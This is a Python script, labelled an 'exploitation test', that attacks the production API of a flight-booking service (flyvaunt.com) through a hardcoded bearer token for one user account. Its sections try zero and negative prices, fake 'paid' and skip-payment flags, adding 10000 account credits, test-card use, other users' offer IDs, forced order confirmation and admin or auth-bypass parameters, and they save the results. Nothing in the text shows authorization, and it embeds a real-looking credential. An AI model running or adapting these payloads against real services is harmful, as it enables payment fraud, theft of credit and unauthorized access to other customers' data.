#!/usr/bin/env python3
"""
COMPREHENSIVE DUFFEL BOOKING API EXPLOITATION TEST

Tests all possible attack vectors for Duffel flight booking integration:
1. Endpoint Discovery
2. Direct Duffel API Access
3. Price Manipulation
4. Payment Bypass
5. Credit/Balance Manipulation
6. Test Card Bypass
7. Offer ID Manipulation
8. Order Status Manipulation
9. Exposed API Keys
10. Parameter Injection

Author: Security Testing
Date: November 5, 2025
"""

import requests
import json
from datetime import datetime, timedelta

# Configuration
PROD_URL = "https://vauntapi.flyvaunt.com"
SAMEER_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoyMDI1NCwiaWF0IjoxNzYyMjMxMTE1LCJleHAiOjE3NjQ4MjMxMTV9.bOz6aK6v9G9B0H2BIXg_N5kWsiBizTbD-v1SlPl3B-Q"
USER_ID = 20254

headers = {
    "Authorization": f"Bearer {SAMEER_TOKEN}",
    "Content-Type": "application/json"
}

# Results storage
vulnerabilities = []
test_results = {
    "endpoint_discovery": [],
    "direct_api_access": [],
    "price_manipulation": [],
    "payment_bypass": [],
    "credit_manipulation": [],
    "test_card_bypass": [],
    "offer_manipulation": [],
    "status_manipulation": [],
    "exposed_keys": [],
    "parameter_injection": []
}

def log_vulnerability(category, severity, title, description, proof):
    """Log a discovered vulnerability"""
    vuln = {
        "category": category,
        "severity": severity,
        "title": title,
        "description": description,
        "proof": proof,
        "discovered_at": datetime.now().isoformat()
    }
    vulnerabilities.append(vuln)
    print(f"\n{'='*80}")
    print(f"üö® VULNERABILITY FOUND: {severity}")
    print(f"{'='*80}")
    print(f"Title: {title}")
    print(f"Description: {description}")
    print(f"Proof: {json.dumps(proof, indent=2)}")
    print(f"{'='*80}\n")

def test_endpoint(method, endpoint, params=None, data=None, description=""):
    """Test an endpoint and return response"""
    url = f"{PROD_URL}{endpoint}"

    try:
        if method == "GET":
            r = requests.get(url, headers=headers, params=params, timeout=10)
        elif method == "POST":
            r = requests.post(url, headers=headers, json=data, timeout=10)
        elif method == "PATCH":
            r = requests.patch(url, headers=headers, json=data, timeout=10)
        elif method == "PUT":
            r = requests.put(url, headers=headers, json=data, timeout=10)
        elif method == "DELETE":
            r = requests.delete(url, headers=headers, timeout=10)
        else:
            return None

        result = {
            "endpoint": endpoint,
            "method": method,
            "status": r.status_code,
            "description": description,
            "params": params,
            "data": data,
            "response": None
        }

        try:
            result["response"] = r.json()
        except:
            result["response"] = r.text[:500]

        return result
    except Exception as e:
        return {
            "endpoint": endpoint,
            "method": method,
            "error": str(e),
            "description": description
        }

print("="*80)
print("COMPREHENSIVE DUFFEL BOOKING API EXPLOITATION TEST")
print("="*80)
print(f"Target: {PROD_URL}")
print(f"User ID: {USER_ID}")
print(f"Started: {datetime.now().isoformat()}")
print("="*80)

# ============================================================================
# 1. ENDPOINT DISCOVERY
# ============================================================================
print("\n" + "="*80)
print("TEST 1: ENDPOINT DISCOVERY")
print("="*80 + "\n")

discovery_endpoints = [
    # V1 Duffel endpoints
    ("GET", "/v1/duffel", None, None, "Base Duffel endpoint"),
    ("GET", "/v1/duffel/offers", None, None, "Flight offers"),
    ("GET", "/v1/duffel/orders", None, None, "Flight orders"),
    ("POST", "/v1/duffel/orders/create", None, {}, "Create order"),
    ("GET", "/v1/booking", None, None, "Booking base"),
    ("GET", "/v1/flights/search", None, None, "Search flights"),
    ("POST", "/v1/flights/book", None, {}, "Book flight"),

    # V2 Duffel endpoints
    ("GET", "/v2/duffel", None, None, "V2 Base Duffel endpoint"),
    ("GET", "/v2/duffel/offers", None, None, "V2 Flight offers"),
    ("GET", "/v2/duffel/orders", None, None, "V2 Flight orders"),

    # App Duffel endpoints
    ("GET", "/v1/app/duffel/airlines", None, None, "Get airlines list"),
    ("GET", "/v1/app/duffel/place-suggestions", {"query": "LAX"}, None, "Search airports"),
    ("GET", "/v1/app/duffel/orders", None, None, "Get user orders"),
    ("GET", "/v1/app/duffel/get-places-by-iata", {"iata": "LAX"}, None, "Get place by IATA"),
    ("POST", "/v1/app/duffel/create-hold-order", None, {}, "Create hold order"),
    ("POST", "/v1/app/duffel/create-order", None, {}, "Create order"),
    ("GET", "/v1/app/duffel/offers", None, None, "Get offers"),

    # Hotel endpoints
    ("GET", "/v1/duffel/stays/geocoding", {"query": "Miami"}, None, "Hotel geocoding"),
    ("GET", "/v1/duffel/stays/search", None, None, "Hotel search"),
    ("GET", "/v1/duffel/stays/offers", None, None, "Hotel offers"),

    # Order management
    ("GET", "/v1/duffel/orders/{orderId}", None, None, "Get specific order"),
    ("PATCH", "/v1/duffel/orders/{orderId}", None, {}, "Update order"),
    ("POST", "/v1/duffel/orders/confirm", None, {}, "Confirm order"),

    # Booking endpoints
    ("GET", "/v1/booking/list", None, None, "List bookings"),
    ("POST", "/v1/booking/create", None, {}, "Create booking"),
    ("POST", "/v1/booking/confirm", None, {}, "Confirm booking"),
    ("POST", "/v1/booking/finalize", None, {}, "Finalize booking"),
    ("PATCH", "/v1/booking/{id}", None, {}, "Update booking"),
]

for method, endpoint, params, data, description in discovery_endpoints:
    result = test_endpoint(method, endpoint, params, data, description)
    test_results["endpoint_discovery"].append(result)

    if result and result.get("status") in [200, 201]:
        print(f"‚úÖ {result['status']} - {method} {endpoint}")
        print(f"   Description: {description}")
        if result.get("response"):
            print(f"   Response: {json.dumps(result['response'], indent=2)[:400]}")
    elif result and result.get("status") == 400:
        print(f"‚ö†Ô∏è  {result['status']} - {method} {endpoint} (Exists but needs params)")
    elif result and result.get("status") == 401:
        print(f"üîê {result['status']} - {method} {endpoint} (Auth required)")
    elif result and result.get("status") == 403:
        print(f"üîê {result['status']} - {method} {endpoint} (Forbidden)")

# ============================================================================
# 2. DIRECT DUFFEL API ACCESS
# ============================================================================
print("\n" + "="*80)
print("TEST 2: DIRECT DUFFEL API ACCESS")
print("="*80 + "\n")

print("Testing if we can access Duffel API directly through Vaunt...")

# Try to search for flight offers
direct_tests = [
    ("POST", "/v1/duffel/offers/search", None, {
        "origin": "LAX",
        "destination": "JFK",
        "departure_date": (datetime.now() + timedelta(days=30)).strftime("%Y-%m-%d"),
        "cabin_class": "economy"
    }, "Search flight offers"),

    ("POST", "/v1/app/duffel/offers/search", None, {
        "origin": "LAX",
        "destination": "JFK",
        "departure_date": (datetime.now() + timedelta(days=30)).strftime("%Y-%m-%d")
    }, "App search flight offers"),

    ("GET", "/v1/duffel/offers", {"origin": "LAX", "destination": "JFK"}, None, "Get offers"),
]

for method, endpoint, params, data, description in direct_tests:
    result = test_endpoint(method, endpoint, params, data, description)
    test_results["direct_api_access"].append(result)

    if result and result.get("status") == 200:
        print(f"‚úÖ {description}: SUCCESS")
        print(f"   Response: {json.dumps(result['response'], indent=2)[:500]}")
        log_vulnerability(
            "Direct API Access",
            "HIGH",
            "Direct Duffel API Access Allowed",
            f"User can directly access Duffel API through {endpoint}",
            result
        )
    else:
        print(f"‚ùå {description}: {result.get('status', 'ERROR')}")

# ============================================================================
# 3. PRICE MANIPULATION
# ============================================================================
print("\n" + "="*80)
print("TEST 3: PRICE MANIPULATION")
print("="*80 + "\n")

print("Testing if we can manipulate flight prices...")

price_tests = [
    ("POST", "/v1/booking/create", None, {
        "flight_id": 1,
        "price": 0,
        "total_amount": "0.00"
    }, "Zero price booking"),

    ("POST", "/v1/booking/create", None, {
        "flight_id": 1,
        "price": 0.01,
        "total_amount": "0.01"
    }, "Penny price booking"),

    ("POST", "/v1/duffel/orders/create", None, {
        "offer_id": "test_offer_123",
        "total_amount": "0.01",
        "price": 1
    }, "Manipulated Duffel order"),

    ("POST", "/v1/app/duffel/create-order", None, {
        "offer_id": "test_offer_123",
        "total_amount": "0.00"
    }, "Zero price Duffel order"),

    ("PATCH", "/v1/booking/1", None, {
        "price": 0,
        "total_amount": "0.00"
    }, "Update booking price to zero"),

    ("POST", "/v1/booking/create", None, {
        "flight_id": 1,
        "price": -100,
        "total_amount": "-100.00"
    }, "Negative price booking"),
]

for method, endpoint, params, data, description in price_tests:
    result = test_endpoint(method, endpoint, params, data, description)
    test_results["price_manipulation"].append(result)

    if result and result.get("status") in [200, 201]:
        print(f"üö® {description}: VULNERABLE!")
        print(f"   Response: {json.dumps(result['response'], indent=2)[:500]}")
        log_vulnerability(
            "Price Manipulation",
            "CRITICAL",
            f"Price Manipulation Possible: {description}",
            f"System accepts price manipulation via {endpoint}",
            result
        )
    else:
        print(f"‚úÖ {description}: Protected ({result.get('status', 'ERROR')})")

# ============================================================================
# 4. PAYMENT BYPASS
# ============================================================================
print("\n" + "="*80)
print("TEST 4: PAYMENT BYPASS")
print("="*80 + "\n")

print("Testing if we can bypass payment requirements...")

payment_tests = [
    ("POST", "/v1/booking/confirm", None, {
        "booking_id": 1
    }, "Confirm without payment"),

    ("POST", "/v1/booking/confirm", None, {
        "booking_id": 1,
        "paid": True
    }, "Force paid status"),

    ("POST", "/v1/booking/finalize", None, {
        "booking_id": 1,
        "paid": True,
        "payment_confirmed": True
    }, "Finalize with fake payment"),

    ("POST", "/v1/duffel/orders/create", None, {
        "offer_id": "test_offer_123",
        "skip_payment": True,
        "skipPayment": True
    }, "Skip payment flag"),

    ("POST", "/v1/app/duffel/create-order", None, {
        "offer_id": "test_offer_123",
        "payment_status": "completed",
        "bypass_payment": True
    }, "Force payment completed status"),
]

for method, endpoint, params, data, description in payment_tests:
    result = test_endpoint(method, endpoint, params, data, description)
    test_results["payment_bypass"].append(result)

    if result and result.get("status") in [200, 201]:
        print(f"üö® {description}: VULNERABLE!")
        print(f"   Response: {json.dumps(result['response'], indent=2)[:500]}")
        log_vulnerability(
            "Payment Bypass",
            "CRITICAL",
            f"Payment Bypass Possible: {description}",
            f"System accepts booking without payment via {endpoint}",
            result
        )
    else:
        print(f"‚úÖ {description}: Protected ({result.get('status', 'ERROR')})")

# ============================================================================
# 5. CREDIT/BALANCE MANIPULATION
# ============================================================================
print("\n" + "="*80)
print("TEST 5: CREDIT/BALANCE MANIPULATION")
print("="*80 + "\n")

print("Testing if we can manipulate flight credits or account balance...")

# First, get current user data
user_result = test_endpoint("GET", "/v1/user", None, None, "Get current user")
print(f"Current user data: {json.dumps(user_result.get('response', {}), indent=2)[:500]}")

credit_tests = [
    ("PATCH", "/v1/user", None, {
        "flightCredits": 10000
    }, "Add flight credits"),

    ("PATCH", "/v1/user", None, {
        "balance": 10000,
        "accountBalance": 10000
    }, "Add account balance"),

    ("POST", "/v1/credits/add", None, {
        "amount": 10000,
        "user_id": USER_ID
    }, "Add credits via endpoint"),

    ("POST", "/v1/balance/add", None, {
        "amount": 10000
    }, "Add balance"),

    ("POST", "/v1/booking/create", None, {
        "flight_id": 1,
        "useCredits": 10000
    }, "Use non-existent credits"),

    ("PATCH", "/v1/user", None, {
        "duffel_credits": 9999
    }, "Add Duffel credits"),
]

for method, endpoint, params, data, description in credit_tests:
    result = test_endpoint(method, endpoint, params, data, description)
    test_results["credit_manipulation"].append(result)

    if result and result.get("status") in [200, 201]:
        print(f"üö® {description}: VULNERABLE!")
        print(f"   Response: {json.dumps(result['response'], indent=2)[:500]}")

        # Verify if credits actually changed
        verify = test_endpoint("GET", "/v1/user", None, None, "Verify user")
        print(f"   Verification: {json.dumps(verify.get('response', {}), indent=2)[:500]}")

        log_vulnerability(
            "Credit Manipulation",
            "CRITICAL",
            f"Credit/Balance Manipulation Possible: {description}",
            f"System accepts credit manipulation via {endpoint}",
            {"request": result, "verification": verify}
        )
    else:
        print(f"‚úÖ {description}: Protected ({result.get('status', 'ERROR')})")

# ============================================================================
# 6. TEST CARD BYPASS
# ============================================================================
print("\n" + "="*80)
print("TEST 6: TEST CARD BYPASS")
print("="*80 + "\n")

print("Testing if we can use test mode or test cards for real bookings...")

test_card_tests = [
    ("POST", "/v1/booking/create", None, {
        "flight_id": 1,
        "payment": {
            "method": "test",
            "test_mode": True
        }
    }, "Test payment method"),

    ("POST", "/v1/duffel/orders/create", None, {
        "offer_id": "test_offer_123",
        "test_mode": True,
        "sandbox": True
    }, "Duffel test mode"),

    ("POST", "/v1/booking/create", None, {
        "flight_id": 1,
        "payment": {
            "card_number": "4242424242424242",
            "test": True
        }
    }, "Stripe test card"),
]

for method, endpoint, params, data, description in test_card_tests:
    result = test_endpoint(method, endpoint, params, data, description)
    test_results["test_card_bypass"].append(result)

    if result and result.get("status") in [200, 201]:
        print(f"üö® {description}: VULNERABLE!")
        print(f"   Response: {json.dumps(result['response'], indent=2)[:500]}")
        log_vulnerability(
            "Test Card Bypass",
            "CRITICAL",
            f"Test Mode Bypass Possible: {description}",
            f"System accepts test mode for real bookings via {endpoint}",
            result
        )
    else:
        print(f"‚úÖ {description}: Protected ({result.get('status', 'ERROR')})")

# ============================================================================
# 7. OFFER ID MANIPULATION
# ============================================================================
print("\n" + "="*80)
print("TEST 7: OFFER ID MANIPULATION")
print("="*80 + "\n")

print("Testing if we can steal or manipulate offer IDs...")

# First try to get real offers
offers_result = test_endpoint("GET", "/v1/app/duffel/orders", None, None, "Get orders")
print(f"Current orders: {json.dumps(offers_result.get('response', {}), indent=2)[:500]}")

offer_tests = [
    ("POST", "/v1/duffel/orders/create", None, {
        "offer_id": "stolen_offer_12345",
        "user_id": USER_ID
    }, "Use fake offer ID"),

    ("POST", "/v1/duffel/orders/create", None, {
        "offer_id": "expired_offer_12345"
    }, "Use expired offer ID"),

    ("POST", "/v1/app/duffel/create-order", None, {
        "offer_id": "other_user_offer_12345"
    }, "Use another user's offer"),
]

for method, endpoint, params, data, description in offer_tests:
    result = test_endpoint(method, endpoint, params, data, description)
    test_results["offer_manipulation"].append(result)

    if result and result.get("status") in [200, 201]:
        print(f"üö® {description}: VULNERABLE!")
        print(f"   Response: {json.dumps(result['response'], indent=2)[:500]}")
        log_vulnerability(
            "Offer ID Manipulation",
            "HIGH",
            f"Offer ID Manipulation Possible: {description}",
            f"System accepts manipulated offer IDs via {endpoint}",
            result
        )
    else:
        print(f"‚úÖ {description}: Protected ({result.get('status', 'ERROR')})")

# ============================================================================
# 8. ORDER STATUS MANIPULATION
# ============================================================================
print("\n" + "="*80)
print("TEST 8: ORDER STATUS MANIPULATION")
print("="*80 + "\n")

print("Testing if we can manipulate order status...")

status_tests = [
    ("PATCH", "/v1/duffel/orders/1", None, {
        "status": "confirmed",
        "payment_status": "completed"
    }, "Force order confirmed"),

    ("POST", "/v1/booking/1/confirm", None, {
        "force_confirm": True
    }, "Force booking confirmation"),

    ("PATCH", "/v1/booking/1", None, {
        "status": "confirmed",
        "paid": True
    }, "Update booking status"),
]

for method, endpoint, params, data, description in status_tests:
    result = test_endpoint(method, endpoint, params, data, description)
    test_results["status_manipulation"].append(result)

    if result and result.get("status") in [200, 201]:
        print(f"üö® {description}: VULNERABLE!")
        print(f"   Response: {json.dumps(result['response'], indent=2)[:500]}")
        log_vulnerability(
            "Status Manipulation",
            "CRITICAL",
            f"Order Status Manipulation Possible: {description}",
            f"System accepts status manipulation via {endpoint}",
            result
        )
    else:
        print(f"‚úÖ {description}: Protected ({result.get('status', 'ERROR')})")

# ============================================================================
# 9. PARAMETER INJECTION
# ============================================================================
print("\n" + "="*80)
print("TEST 9: PARAMETER INJECTION")
print("="*80 + "\n")

print("Testing parameter injection attacks...")

param_tests = [
    ("GET", "/v1/duffel/offers", {"showAll": "true", "admin": "true"}, None, "Admin parameter"),
    ("GET", "/v1/booking", {"includeAll": "true", "admin": "true"}, None, "Include all parameter"),
    ("GET", "/v1/duffel/orders", {"userId": "1", "limit": "9999"}, None, "Access other user orders"),
    ("GET", "/v1/app/duffel/orders", {"all": "true", "showAll": "true"}, None, "Show all orders"),
    ("GET", "/v1/duffel/orders", {"bypass_auth": "true"}, None, "Bypass auth parameter"),
    ("GET", "/v1/booking/list", {"admin": "1", "debug": "1"}, None, "Admin debug mode"),
]

for method, endpoint, params, data, description in param_tests:
    result = test_endpoint(method, endpoint, params, data, description)
    test_results["parameter_injection"].append(result)

    if result and result.get("status") == 200:
        response = result.get("response", {})
        # Check if we got more data than expected
        if isinstance(response, list) and len(response) > 0:
            print(f"‚ö†Ô∏è  {description}: Got {len(response)} items")
            print(f"   Response: {json.dumps(response, indent=2)[:500]}")
            log_vulnerability(
                "Parameter Injection",
                "HIGH",
                f"Parameter Injection Possible: {description}",
                f"System accepts injected parameters via {endpoint}",
                result
            )
        elif isinstance(response, dict) and len(response) > 0:
            print(f"‚ö†Ô∏è  {description}: Got response with keys: {list(response.keys())}")
            print(f"   Response: {json.dumps(response, indent=2)[:500]}")
    else:
        print(f"‚úÖ {description}: Protected ({result.get('status', 'ERROR')})")

# ============================================================================
# 10. EXPOSED API KEYS CHECK
# ============================================================================
print("\n" + "="*80)
print("TEST 10: CHECKING FOR EXPOSED DUFFEL API KEYS")
print("="*80 + "\n")

print("Checking responses for exposed API keys...")

for category, results in test_results.items():
    for result in results:
        if result.get("response"):
            response_str = json.dumps(result.get("response"))

            # Check for Duffel API key patterns
            if "duffel_test_" in response_str.lower() or "duffel_live_" in response_str.lower():
                print(f"üö® EXPOSED DUFFEL API KEY in {result.get('endpoint')}!")
                log_vulnerability(
                    "Exposed API Keys",
                    "CRITICAL",
                    "Duffel API Key Exposed",
                    f"Duffel API key found in response from {result.get('endpoint')}",
                    result
                )

            # Check for any bearer tokens
            if "bearer" in response_str.lower() and "token" in response_str.lower():
                print(f"‚ö†Ô∏è  Potential token exposure in {result.get('endpoint')}")

print("‚úÖ API key check complete")

# ============================================================================
# FINAL SUMMARY
# ============================================================================
print("\n" + "="*80)
print("EXPLOITATION TEST SUMMARY")
print("="*80 + "\n")

print(f"Total Tests Executed: {sum(len(v) for v in test_results.values())}")
print(f"Vulnerabilities Found: {len(vulnerabilities)}")
print()

if vulnerabilities:
    print("üö® VULNERABILITIES DISCOVERED:\n")

    critical = [v for v in vulnerabilities if v["severity"] == "CRITICAL"]
    high = [v for v in vulnerabilities if v["severity"] == "HIGH"]
    medium = [v for v in vulnerabilities if v["severity"] == "MEDIUM"]

    if critical:
        print(f"CRITICAL ({len(critical)}):")
        for v in critical:
            print(f"  - {v['title']}")

    if high:
        print(f"\nHIGH ({len(high)}):")
        for v in high:
            print(f"  - {v['title']}")

    if medium:
        print(f"\nMEDIUM ({len(medium)}):")
        for v in medium:
            print(f"  - {v['title']}")
else:
    print("‚úÖ No vulnerabilities found. System appears secure.")

print("\n" + "="*80)
print("ATTACK VECTOR RESULTS")
print("="*80 + "\n")

print(f"1. Endpoint Discovery: {len(test_results['endpoint_discovery'])} endpoints tested")
print(f"2. Direct API Access: {len(test_results['direct_api_access'])} tests")
print(f"3. Price Manipulation: {len(test_results['price_manipulation'])} tests")
print(f"4. Payment Bypass: {len(test_results['payment_bypass'])} tests")
print(f"5. Credit Manipulation: {len(test_results['credit_manipulation'])} tests")
print(f"6. Test Card Bypass: {len(test_results['test_card_bypass'])} tests")
print(f"7. Offer Manipulation: {len(test_results['offer_manipulation'])} tests")
print(f"8. Status Manipulation: {len(test_results['status_manipulation'])} tests")
print(f"9. Parameter Injection: {len(test_results['parameter_injection'])} tests")
print(f"10. Exposed Keys: Checked")

# Save results to file
output_file = "/home/user/vaunt/api_testing/duffel_exploitation_results.json"
output_data = {
    "test_date": datetime.now().isoformat(),
    "target": PROD_URL,
    "user_id": USER_ID,
    "test_results": test_results,
    "vulnerabilities": vulnerabilities,
    "summary": {
        "total_tests": sum(len(v) for v in test_results.values()),
        "vulnerabilities_found": len(vulnerabilities),
        "critical": len([v for v in vulnerabilities if v["severity"] == "CRITICAL"]),
        "high": len([v for v in vulnerabilities if v["severity"] == "HIGH"]),
        "medium": len([v for v in vulnerabilities if v["severity"] == "MEDIUM"])
    }
}

with open(output_file, 'w') as f:
    json.dump(output_data, f, indent=2)

print(f"\n‚úÖ Results saved to: {output_file}")
print(f"\nTest completed at: {datetime.now().isoformat()}")
print("="*80)
